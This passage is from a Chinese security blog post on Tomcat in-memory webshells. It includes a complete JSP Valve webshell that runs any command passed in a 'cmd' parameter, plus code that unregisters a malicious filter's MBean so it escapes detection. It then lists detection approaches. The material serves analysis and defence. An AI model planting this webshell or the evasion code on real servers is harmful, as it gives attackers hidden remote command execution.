+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStream&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.util.Scanner&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.PrintWriter&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.Wrapper&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.valves.ValveBase&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.connector.Request&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.connector.Response&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">contentType</span><span class="o">=</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span> <span class="n">language</span><span class="o">=</span><span class="s">&#34;java&#34;</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span>
+    <span class="n">ValveBase</span> <span class="n">StandardContextsValve</span>  <span class="o">=</span> <span class="k">new</span> <span class="n">ValveBase</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Request</span> <span class="n">request</span><span class="o">,</span> <span class="n">Response</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
+            <span class="n">HttpServletRequest</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletRequest</span><span class="o">)</span> <span class="n">request</span><span class="o">;</span>
+            <span class="n">HttpServletResponse</span> <span class="n">resp</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletResponse</span><span class="o">)</span> <span class="n">response</span><span class="o">;</span>
+            <span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span> <span class="n">cmd</span><span class="o">!=</span> <span class="kc">null</span><span class="o">&amp;&amp;!</span><span class="s">&#34;&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">cmd</span><span class="o">))</span> <span class="o">{</span>
+                <span class="kt">boolean</span> <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+                <span class="n">String</span> <span class="n">osTyp</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">osTyp</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osTyp</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isLinux</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
+                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
+                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
+                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+                <span class="n">resp</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
+                <span class="n">resp</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">getNext</span><span class="o">().</span><span class="na">invoke</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">};</span>
+
+    <span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
+
+    <span class="n">Field</span> <span class="n">appctx</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">appctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">appctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
+
+    <span class="n">Field</span> <span class="n">stdctx</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">stdctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">stdctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
+<span class="c1">// 直接通过StandardContext获取当前容器的Pipeline，往里面添加Valve内存马即可
+</span><span class="c1"></span>    <span class="n">standardContext</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">addValve</span><span class="o">(</span><span class="n">StandardContextsValve</span><span class="o">);</span>
+<span class="o">%&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="内存马检测"><a href="#内存马检测" class="anchor-link">#</a><a href="#contents:内存马检测" class="headings">内存马检测</a></h2>
+<ol>
+<li>
+<p>利用VisualVM监控mbean</p>
+<p>注册Filter的时候会触发registerJMX的操作来注册mbean。</p>
+<ul>
+<li>
+<p>但可以在代码中删除注册的mbean</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">javax.management.MBeanServer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.management.ObjectName</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Set</span><span class="o">;</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">UnRegister</span> <span class="o">{</span>
+    <span class="kd">static</span>  <span class="o">{</span>
+        <span class="k">try</span><span class="o">{</span>
+        <span class="n">Class</span> <span class="n">registryClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.tomcat.util.modeler.Registry&#34;</span><span class="o">);</span>
+        <span class="n">MBeanServer</span> <span class="n">mBeanServer</span> <span class="o">=</span> <span class="o">(</span><span class="n">MBeanServer</span><span class="o">)</span> <span class="n">registryClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getMBeanServer&#34;</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span> <span class="n">registryClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRegistry&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">));</span>
+        <span class="n">Set</span><span class="o">&lt;</span><span class="n">ObjectName</span><span class="o">&gt;</span> <span class="n">objectNameSet</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="n">objectNameSet</span> <span class="o">=</span> <span class="n">mBeanServer</span><span class="o">.</span><span class="na">queryNames</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+            <span class="k">for</span> <span class="o">(</span><span class="n">ObjectName</span> <span class="n">objectName</span> <span class="o">:</span> <span class="n">objectNameSet</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="s">&#34;Filter&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">objectName</span><span class="o">.</span><span class="na">getKeyProperty</span><span class="o">(</span><span class="s">&#34;j2eeType&#34;</span><span class="o">)))</span> <span class="o">{</span>
+                    <span class="n">Object</span> <span class="n">filterName</span> <span class="o">=</span> <span class="n">mBeanServer</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">objectName</span><span class="o">,</span> <span class="s">&#34;filterName&#34;</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="s">&#34;litchi&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">filterName</span><span class="o">))</span> <span class="o">{</span>
+                        <span class="n">mBeanServer</span><span class="o">.</span><span class="na">unregisterMBean</span><span class="o">(</span><span class="n">objectName</span><span class="o">);</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>利用Java Instrument（Java Agent）检测</p>
+<p>对于敏感类（比如实现了javax.servlet.Filter接口的类）利用retransformClasses方法进行retransform，编写ClassFileTransformer实现类将这些敏感类加载的class dump出来，接着就可以使用反编译工具转换成源代码判断是否是Webshell</p>
+<p>利用工具: <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">alibaba/arthas</a></p>
+</li>
+<li>
+<p><a href="https://www.anquanke.com/post/id/219177" target="_blank" rel="noopener">利用 Agent 的检测思路</a></p>
+<ol>
+<li>获取tomcat jvm中所有加载的类</li>
+<li>遍历每个类，把可能被攻击方新增/修改内存中的类，标记为风险类（比如实现了filter/servlet的类）</li>
+<li>遍历风险类，检查高风险类的class文件是否存在（c磁盘中没有对应的class文件只驻留在内存）。反编译风险类字节码，检查java文件中包含恶意代码</li>
+</ol>
+</li>
+<li>
+<p>classLoader可疑：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader</code></p>
+<p>这是反序列化漏洞执行代码用的classLoader或其他自定义的classloader。</p>
+</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+<ol>
+<li><a href="http://wjlshare.com/archives/1529" target="_blank" rel="noopener">Tomcat 内存马学习(一)：Filter型</a></li>
+<li><a href="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bvalve%E5%86%85%E5%AD%98%E9%A9%AC/" target="_blank" rel="noopener">Tomcat之Valve内存马</a></li>
+</ol>
+
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" target="_blank" rel="noopener">https://myzxcg.com/2021/10/Tomcat-内存马分析及检测/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Spring 内存马实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" class="related-link">Weblogic 内存马分析与实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Shiro 回显与内存马实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/" class="related-link">Tomcat 架构与Context分析</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E4%B8%8E%E5%88%A9%E7%94%A8/" class="related-link">FastJson 反序列化绕过与利用</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+
+
+        
+    <footer class="minimal-footer">
+        
+            <div class="post-tag"><a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag" class="post-tag-link">#java安全</a></div>
+        
+        
+        
+            
+        
+    </footer>
+
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" rel="prev">&lt; Shiro 回显与内存马实现</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/" rel="next">Tomcat 架构与Context分析 &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+    
+
+        
+            <div class="load-comments">
+                <div id="load-comments">加载评论</div>
+            </div>
+        
+
+        
+
+        
+            <div id="vcomments"></div>
+        
+
+        
+
+        
+    
+
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            
+
+            
+    
+        <ul class="socials"><li class="socials-item">
+                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
+                </li></ul>
+    
+
+
+            <div class="site-info">©&nbsp;2021&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+              </div>
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+
+
+
+
+
+
+    
+
+        
+
+        
+            <script>
+    function loadComments() {
+        if (typeof Valine === 'undefined') {
+            var getScript = (options) => {
+                var script = document.createElement('script');
+                script.defer = true;
+                script.crossOrigin = 'anonymous';
+                Object.keys(options).forEach((key) => {
+                    script[key] = options[key];
+                });
+                document.body.appendChild(script);
+            };
+            getScript({
+                src: '//unpkg.com/valine@latest/dist/Valine.min.js',
+                onload: () => {
+                    newValine();
+                }
+            });
+        } else {
+            newValine();
+        }
+    }
+    function newValine() {
+        new Valine({
+            el: '#vcomments',
+            appId: '6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI',
+            appKey: '0GcKEskKSnNfqn5dbNITfO4H',
+            placeholder: '有问题欢迎交流',
+            path: location.pathname,
+            avatar: 'mp',
+            meta: ["nick","mail","link"],
+            pageSize:  10 ,
+            lang: 'zh-cn',
+            visitor:  false ,
+            highlight:  true ,
+            avatarForce:  false ,
+            recordIP:  true ,
+            serverURLs: '',
+            emojiCDN: '',
+            emojiMaps: {},
+            enableQQ:  false ,
+            requiredFields: []
+        });
+    }
+</script>
+
+        
+
+        
+
+        
+
+    
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    let imgNodes = document.querySelectorAll('div.post-body img');
+    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");
+
+    mediumZoom(imgNodes, {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+
+
+
+    </body>
+</html>
